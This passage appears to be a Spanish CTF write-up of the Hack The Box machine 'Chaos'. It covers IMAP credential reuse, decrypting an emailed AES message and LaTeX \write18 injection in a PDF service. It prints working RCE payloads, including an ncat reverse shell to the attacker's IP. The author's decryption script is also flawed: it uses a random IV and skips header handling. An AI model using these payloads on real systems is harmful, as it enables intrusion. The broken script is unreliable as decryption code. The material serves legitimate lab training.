<script> setTimeout(function(){var a=document.querySelectorAll('input[type="password"]');i=0;for(length=a.length;i<length;i++){var b=document.createElement("span"),d=30<a[i].offsetHeight?1:0;b.classList.add("input_warning_caps");b.setAttribute("title","CapsLock");d&&b.classList.add("large");a[i].classList.add("use_input_warning_caps");a[i].parentNode.insertBefore(b,a[i].nextSibling);a[i].addEventListener("blur",function(){this.nextSibling.classList.remove("visible")});a[i].addEventListener("keydown",function(c){"function"===typeof c.getModifierState&&((state=20===c.keyCode?!c.getModifierState("CapsLock"):c.getModifierState("CapsLock"))?this.nextSibling.classList.add("visible"):this.nextSibling.classList.remove("visible"))})};},100);function spinner() {var x = document.querySelector('.fa-sign-in:not(.invisible)'),s = '<span class="cspinner_container"><span class="cspinner"><span class="cspinner-icon white small"></span></span></span>';if(x){x.classList.add("invisible"); x.insertAdjacentHTML('afterend', s);x.parentNode.classList.add("disabled");x.parentNode.disabled=true}} </script>
<link href="/unauthenticated/css/fonts-roboto.min.css?1919999999999911" rel="stylesheet">
</head>
<body class="session_login">
<div class="container session_login" data-dcontainer="1">

<form method="post" target="_top" action="/session_login.cgi" class="form-signin session_login clearfix" role="form" onsubmit="spinner()">
<i class="wbm-webmin"></i><h2 class="form-signin-heading">
     <span>Webmin</span></h2>
<p class="form-signin-paragraph">You must enter a username and password to login to the server on<strong> 10.10.10.120</strong></p>
<div class="input-group form-group">
<span class="input-group-addon"><i class="fa fa-fw fa-user"></i></span>
<input type="text" class="form-control session_login" name="user" autocomplete="off" autocapitalize="none" placeholder="Username"  autofocus>
</div>
<div class="input-group form-group">
<span class="input-group-addon"><i class="fa fa-fw fa-lock"></i></span>
<input type="password" class="form-control session_login" name="pass" autocomplete="off" placeholder="Password"  >
</div>
<div class="input-group form-group">
            <span class="awcheckbox awobject"><input class="iawobject" name="save" value="1" id="save" type="checkbox"> <label class="lawobject" for="save">Remember me</label></span>
         </div>
<div class="form-group form-signin-group"><button class="btn btn-primary" type="submit"><i class="fa fa-sign-in"></i>&nbsp;&nbsp;Sign in</button>
</div></form>
</div>
</body>
</html>
```

Ahora si queremos hacer un post en la pagina debemos usar un navegador puesto que ejecuta una función de js al hacer el onsubmit.

![Login on Webmail](/img/htb-chaos/www-webmail-login.png)

Perooo después de tratar de acceder, observaremos que nos indica un mensaje de error con las credenciales que obtuvimos. Esto es esperado, porque la nota decía "webmail" no "webmin".

Ahora, como no encontré via `gobuster` la carpeta con el webmail, lo que decidí hacer es el siguiente paso; **usar la información que tengo en otros servicios**. En este caso usar las credenciales en los servicios aun no explorados.

# IMAP, IMAP a trabajar

Ok, me gustan mucho las herramientas simples de consola, así que decidí conectarme por telnet/curl:

```text
xbytemx@laptop:~/htb/chaos$ curl imap://ayush:jiujitsu@10.10.10.120
curl: (67) Login denied
xbytemx@laptop:~/htb/chaos$ telnet 10.10.10.120 143
Trying 10.10.10.120...
Connected to 10.10.10.120.
Escape character is '^]'.
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS LOGINDISABLED] Dovecot (Ubuntu) ready.
. login  ayush@chaos.htb jiujitsu
* BAD [ALERT] Plaintext authentication not allowed without SSL/TLS, but your client did it anyway. If anyone was listening, the password was exposed.
. NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
^C
xbytemx@laptop:~/htb/chaos$ curl imaps://ayush:jiujitsu@10.10.10.120
curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.haxx.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
xbytemx@laptop:~/htb/chaos$ curl -k imaps://ayush:jiujitsu@10.10.10.120
* LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
* LIST (\NoInferiors \UnMarked \Sent) "/" Sent
* LIST (\HasNoChildren) "/" INBOX
```

Como pudimos ver, nos acepta las credenciales por lo que ahora podemos usar `mbsync` para bajarnos el buzón del usuario _ayush_

```text
xbytemx@laptop:~/htb/chaos$ cat mbsyncrc
IMAPAccount chaos
Host chaos.htb
User ayush
Pass jiujitsu
SSLType IMAPS
CertificateFile ~/htb/chaos/chaos.pem

IMAPStore chaos-remote
Account chaos

MaildirStore chaos-local
Subfolders Verbatim
Path ~/htb/chaos/mail-chaos/
Inbox ~/htb/chaos/mail-chaos/Inbox

Channel chaos
Master :chaos-remote:
Slave :chaos-local:
Patterns *
Create Both
SyncState *
xbytemx@laptop:~/htb/chaos$ openssl s_client -connect 10.10.10.120:993 -showcerts 2>&1 < /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' | sed -ne '1,/-END CERTIFICATE-/p' > chaos.pem
xbytemx@laptop:~/htb/chaos$ mbsync -c $PWD/mbsync chaos
C: 0/1  B: 0/3  M: +0/0 *0/0 #0/0  S: +0/0 *0/0 #0/0
Maildir notice: no UIDVALIDITY, creating new.
C: 0/1  B: 1/3  M: +0/0 *0/0 #0/0  S: +0/0 *0/0 #0/0
Maildir notice: no UIDVALIDITY, creating new.
C: 0/1  B: 2/3  M: +0/0 *0/0 #0/0  S: +1/1 *0/0 #0/0
Maildir notice: no UIDVALIDITY, creating new.
C: 1/1  B: 3/3  M: +0/0 *0/0 #0/0  S: +1/1 *0/0 #0/0
```

Ya que descargamos el buzón de _ayush_ exploremos en casa su contenido y encontraremos el siguiente draft:

```text
xbytemx@laptop:~$ cat mail-chaos/Drafts/cur/1556337228.17058_1.laptop\,U\=1\:2\,S
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="=_00b34a28b9033c43ed09c0950f4176e1"
Date: Sun, 28 Oct 2018 17:46:38 +0530
From: ayush <ayush@localhost>
To: undisclosed-recipients:;
Subject: service
Message-ID: <7203426a8678788517ce8d28103461bd@webmail.chaos.htb>
X-Sender: ayush@localhost
User-Agent: Roundcube Webmail/1.3.8
X-TUID: EzTG0mbDWEYx

--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=US-ASCII;
 format=flowed

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush

--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: base64
Content-Type: application/octet-stream;
 name=enim_msg.txt
Content-Disposition: attachment;
 filename=enim_msg.txt;
 size=272

MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9
RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M
7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e
6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge
+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=
--=_00b34a28b9033c43ed09c0950f4176e1
Content-Transfer-Encoding: base64
Content-Type: text/x-python; charset=us-ascii;
 name=en.py
Content-Disposition: attachment;
 filename=en.py;
 size=804

ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv
dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl
dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK
CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo
IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0
RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6
ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg
ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu
a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg
ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog
ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2
KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r
KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3
KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl
c3QoKQoK
--=_00b34a28b9033c43ed09c0950f4176e1--
```

Ayush estaba preparando un correo con un texto cifrado, el script de cifrado y nos dice que la contraseña es **sahay**

Cambiemos el encoding de BASE64 a Texto para en.py y tendremos lo siguiente:

```python
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
```

Como podemos ver, este programa devuelve un en + filename que cifra en AES_128_CBC usando el hash SHA256 de una contraseña como llave.

Realizar el proceso inverso es relativamente simple, por lo que cree de.py:

```python
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

import os

def decrypt(key, filename):
    chunksize = 64*1024
    outputFile = filename[2:]
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV = Random.new().read(16)

    decryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(decryptor.decrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()

decrypt(getKey("sahay"), "enim_msg.txt")
```

Este programa me devuelve im_msg.txt usando el proceso inverso anteriormente descrito.

El contenido de im_msg.txt es el siguiente:

```text
xbytemx@laptop:~/htb/chaos$ strings im_msg.txt
0000000000000272
tg42C
sLPO
SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
```

Como podemos ver, el contenido no es muy entendible, pero ese ultimo string parece un BASE64, por lo que despues de cambiar el encoding:

```text
xbytemx@laptop:~/htb/chaos$ printf "SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK" | base64 -d
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,
Ayush
```

Parece que hemos encontrado un nuevo sitio en el servicio HTTP TCP/80.

# You will find nothing here (includes RCE)

Comenzamos por validar su existencia vía headers:

```text
xbytemx@laptop:~/htb/chaos$ curl -I http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/
HTTP/1.1 200 OK
Date: Sat, 27 Apr 2019 04:54:00 GMT
Server: Apache/2.4.34 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

Ahora, usando un browser:

![Chaos Inc PDF](/img/htb-chaos/www-hiden-pdftex.png)

Como podemos ver parece que se trata de una herramienta para convertir una plantilla a PDF. Veamos por consola como se comporta por defecto cuando generamos un PDF:

```text
xbytemx@laptop:~/htb/chaos$ http -f POST http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php 'content=hello' template=test3
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 820
Content-Type: text/html; charset=UTF-8
Date: Sat, 27 Apr 2019 05:17:55 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding

FILE CREATED: 1dc4b77d86170fff881960b55c83fa75.pdf
Download: http://chaos.htb/pdf/1dc4b77d86170fff881960b55c83fa75.pdf


LOG:
This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
 \write18 enabled.
entering extended mode
(./1dc4b77d86170fff881960b55c83fa75.tex
LaTeX2e <2018-04-01> patch level 5
(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
Document Class: article 2014/09/29 v1.4h Standard LaTeX document class
(/usr/share/texlive/texmf-dist/tex/latex/base/size11.clo))
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype-pdftex.def)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.cfg))
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
(/usr/share/texlive/texmf-dist/tex/latex/wrapfig/wrapfig.sty)
(/usr/share/texlive/texmf-dist/tex/latex/psnfss/mathpazo.sty)
(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/t1enc.def))
No file 1dc4b77d86170fff881960b55c83fa75.aux.
(/usr/share/texlive/texmf-dist/tex/latex/psnfss/t1ppl.fd)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-ppl.cfg)
(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
[Loading MPS to PDF converter (version 2006.09.02).]
) (/usr/share/texlive/texmf-dist/tex/latex/oberdiek/epstopdf-base.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/infwarerr.sty)
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/grfext.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/kvdefinekeys.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ltxcmds.sty)))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/kvoptions.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/kvsetkeys.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/etexcmds.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifluatex.sty))))
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdftexcmds.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifpdf.sty))
(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))
[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map}]
(./1dc4b77d86170fff881960b55c83fa75.aux) ){/usr/share/texlive/texmf-dist/fonts/
enc/dvips/base/8r.enc}</usr/share/texlive/texmf-dist/fonts/type1/urw/palatino/u
plb8a.pfb></usr/share/texlive/texmf-dist/fonts/type1/urw/palatino/uplr8a.pfb></
usr/share/texlive/texmf-dist/fonts/type1/urw/palatino/uplri8a.pfb>
Output written on 1dc4b77d86170fff881960b55c83fa75.pdf (1 page, 37550 bytes).
Transcript written on 1dc4b77d86170fff881960b55c83fa75.log.
```

El LOG nos arroja la versión y el binario que se esta utilizando `pdfTeX, Version 3.14159265-2.6-1.40.19`. Busque rápidamente el google y encontré el siguiente **[enlace](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)** que explica como podríamos aprovecharnos de la instrucción de latex `\\write18` para ejecutar comandos de manera remota (RCE), así que, apliquemos nuestra PoC:

```text
xbytemx@laptop:~/htb/chaos$ http -f POST http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php 'content=\\immediate\\write18{echo; echo; ls -Ral /home}' template=test3
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 925
Content-Type: text/html; charset=UTF-8
Date: Sat, 27 Apr 2019 05:17:16 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.34 (Ubuntu)
Vary: Accept-Encoding

FILE CREATED: 461fb8e49fbfdfe012a5e1794dcb45a9.pdf
Download: http://chaos.htb/pdf/461fb8e49fbfdfe012a5e1794dcb45a9.pdf


LOG:
This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
 \write18 enabled.
entering extended mode
(./461fb8e49fbfdfe012a5e1794dcb45a9.tex
LaTeX2e <2018-04-01> patch level 5
(/usr/share/texlive/texmf-dist/tex/latex/base/article.cls
Document Class: article 2014/09/29 v1.4h Standard LaTeX document class
(/usr/share/texlive/texmf-dist/tex/latex/base/size11.clo))
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/keyval.sty)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype-pdftex.def)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/microtype.cfg))
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphicx.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/graphics.sty
(/usr/share/texlive/texmf-dist/tex/latex/graphics/trig.sty)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-cfg/graphics.cfg)
(/usr/share/texlive/texmf-dist/tex/latex/graphics-def/pdftex.def)))
(/usr/share/texlive/texmf-dist/tex/latex/wrapfig/wrapfig.sty)
(/usr/share/texlive/texmf-dist/tex/latex/psnfss/mathpazo.sty)
(/usr/share/texlive/texmf-dist/tex/latex/base/fontenc.sty
(/usr/share/texlive/texmf-dist/tex/latex/base/t1enc.def))
No file 461fb8e49fbfdfe012a5e1794dcb45a9.aux.
(/usr/share/texlive/texmf-dist/tex/latex/psnfss/t1ppl.fd)
(/usr/share/texlive/texmf-dist/tex/latex/microtype/mt-ppl.cfg)
(/usr/share/texlive/texmf-dist/tex/context/base/mkii/supp-pdf.mkii
[Loading MPS to PDF converter (version 2006.09.02).]
) (/usr/share/texlive/texmf-dist/tex/latex/oberdiek/epstopdf-base.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/infwarerr.sty)
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/grfext.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/kvdefinekeys.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ltxcmds.sty)))
(/usr/share/texlive/texmf-dist/tex/latex/oberdiek/kvoptions.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/kvsetkeys.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/etexcmds.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifluatex.sty))))
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/pdftexcmds.sty
(/usr/share/texlive/texmf-dist/tex/generic/oberdiek/ifpdf.sty))
(/usr/share/texlive/texmf-dist/tex/latex/latexconfig/epstopdf-sys.cfg))

/home:
total 16
drwxr-xr-x  4 root  root  4096 Oct 28 11:34 .
drwxr-xr-x 22 root  root  4096 Dec  9 17:19 ..
drwx------  6 ayush ayush 4096 Apr 27 00:09 ayush
drwx------  5 sahay sahay 4096 Nov 24 23:53 sahay

[1{/var/lib/texmf/fonts/map/pdftex/updmap/pdftex.map}]
(./461fb8e49fbfdfe012a5e1794dcb45a9.aux) ){/usr/share/texlive/texmf-dist/fonts/
enc/dvips/base/8r.enc}</usr/share/texlive/texmf-dist/fonts/type1/urw/palatino/u
plb8a.pfb></usr/share/texlive/texmf-dist/fonts/type1/urw/palatino/uplr8a.pfb></
usr/share/texlive/texmf-dist/fonts/type1/urw/palatino/uplri8a.pfb>
Output written on 461fb8e49fbfdfe012a5e1794dcb45a9.pdf (1 page, 37304 bytes).
Transcript written on 461fb8e49fbfdfe012a5e1794dcb45a9.log.
```

Perfecto, parece que ahora ya podemos hacer un RCE sobre el servidor, por lo que lo siguiente es invocar una reverse shell.

Preparamos un listener:

```text
xbytemx@laptop:~/htb/chaos$ ncat -lnp 3001
```

Ejecutamos un reverse shell:

```text
xbytemx@laptop:~/htb/chaos$ http -f POST http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php 'content=\\immediate\\write18{ncat 10.10.14.12 3001 -e /bin/bash}' template=test3

http: error: Request timed out (30s).
```

En nuestro listener:

```text
xbytemx@laptop:~/htb/chaos$ ncat -lnp 3001
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
```

# From www-data to ???

Bien ahora que ya tenemos conexión al servidor y que hemos hecho el upgrade de la tty, veamos que hay sobre home:

```text
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -la /home
ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Oct 28  2018 .
drwxr-xr-x 22 root  root  4096 Dec  9 17:19 ..
drwx------  6 ayush ayush 4096 May 25 16:12 ayush
drwx------  5 sahay sahay 4096 Nov 24 23:53 sahay
```

Los dos usuarios del correo. Solo que como somos www-data, no podemos leer nada del contenido de cada home por los permisos. Luego entonces, centremonos en lo que si tenemos permisos:

```text
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www
<00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www
total 20K
drwxr-xr-x  5 root     root     4.0K Oct 28  2018 .
drwxr-xr-x 14 root     root     4.0K Oct 28  2018 ..
drwxr-xr-x  3 root     root     4.0K Oct 28  2018 html
drwxr-xr-x  8 root     root     4.0K Oct 28  2018 main
drwxr-xr-x 13 www-data www-data 4.0K Oct 23  2018 roundcube
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/html
<ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/html
total 16K
drwxr-xr-x 3 root root 4.0K Oct 28  2018 .
drwxr-xr-x 5 root root 4.0K Oct 28  2018 ..
-rw-r--r-- 1 root root   73 Oct 28  2018 index.html
drwxr-xr-x 3 root root 4.0K Oct 28  2018 wp
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/main/
<l_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/main/
total 68K
drwxr-xr-x 8 root root 4.0K Oct 28  2018 .
drwxr-xr-x 5 root root 4.0K Oct 28  2018 ..
drwxr-xr-x 9 root root 4.0K Oct 28  2018 J00_w1ll_f1Nd_n07H1n9_H3r3
-rw-r--r-- 1 root root 5.5K Oct 24  2018 about.html
-rw-r--r-- 1 root root   46 Oct 24  2018 blog.html
-rw-r--r-- 1 root root 4.6K Oct 19  2018 contact.html
drwxr-xr-x 2 root root 4.0K Oct 19  2018 css
-rw-r--r-- 1 root root 6.7K Oct 24  2018 hof.html
drwxr-xr-x 2 root root 4.0K Apr  8  2018 icon-fonts
drwxr-xr-x 8 root root 4.0K Oct 19  2018 img
-rw-r--r-- 1 root root 6.9K Oct 26  2018 index.html
drwxr-xr-x 2 root root 4.0K Apr  8  2018 js
drwxr-xr-x 3 root root 4.0K Apr  8  2018 source
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/roundcube
<Nd_n07H1n9_H3r3/compile$ ls -lah /var/www/roundcube
total 284K
drwxr-xr-x 13 www-data www-data 4.0K Oct 23  2018 .
drwxr-xr-x  5 root     root     4.0K Oct 28  2018 ..
-rw-r--r--  1 www-data www-data 3.2K Oct 23  2018 .htaccess
-rw-r--r--  1 www-data www-data 152K Oct 23  2018 CHANGELOG
-rw-r--r--  1 www-data www-data  11K Oct 23  2018 INSTALL
-rw-r--r--  1 www-data www-data  35K Oct 23  2018 LICENSE
-rw-r--r--  1 www-data www-data 3.8K Oct 23  2018 README.md
drwxr-xr-x  7 www-data www-data 4.0K Oct 23  2018 SQL
-rw-r--r--  1 www-data www-data 3.5K Oct 23  2018 UPGRADING
drwxr-xr-x  2 www-data www-data 4.0K Oct 28  2018 bin
-rw-r--r--  1 www-data www-data 1.1K Oct 23  2018 composer.json-dist
drwxr-xr-x  2 www-data www-data 4.0K Oct 28  2018 config
-rw-r--r--  1 www-data www-data  13K Oct 23  2018 index.php
drwxr-xr-x  3 www-data www-data 4.0K Oct 28  2018 installer
drwxrwxr-x  2 www-data www-data 4.0K Oct 28  2018 logs
drwxr-xr-x 35 www-data www-data 4.0K Oct 28  2018 plugins
drwxr-xr-x  8 www-data www-data 4.0K Oct 28  2018 program
drwxr-xr-x  3 www-data www-data 4.0K Oct 28  2018 public_html
drwxr-xr-x  4 www-data www-data 4.0K Oct 28  2018 skins
drwxrwxr-x  2 www-data www-data 4.0K May 25 19:37 temp
drwxr-xr-x  8 www-data www-data 4.0K Oct 28  2018 vendor
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$
```

Tenemos las tres carpetas de `/var/www`, main, html y roundcube. El que esta en html corresponde al vhost de root, porque no lleva dominio declarado, el main corresponde a chaos, chaos.htb porque fue el que necesitabamos agregar durante las primeras etapas de enumeración. El que no encontramos y era porque se trataba de otro dominio o vhost, es el de roundcube. Este software es conocido por ser el frontend para dovecot, lo que lo convierte en el webmail perdido.

Comprobamos esto contra los sitios habilitados:

```text
www-data@chaos:/var/www/main/J00_w1ll_f1Nd_n07H1n9_H3r3/compile$ cat /etc/apache2/sites-enabled/*
<H1n9_H3r3/compile$ cat /etc/apache2/sites-enabled/*
<VirtualHost *:80>
	# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
<VirtualHost *:80>
	ServerName chaos.htb

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/main

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error_main.log
	CustomLog ${APACHE_LOG_DIR}/access_main.log combined

	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
<VirtualHost *:80>
	ServerName webmail.chaos.htb

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/roundcube

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error_roundcube.log
	CustomLog ${APACHE_LOG_DIR}/access_roundcube.log combined

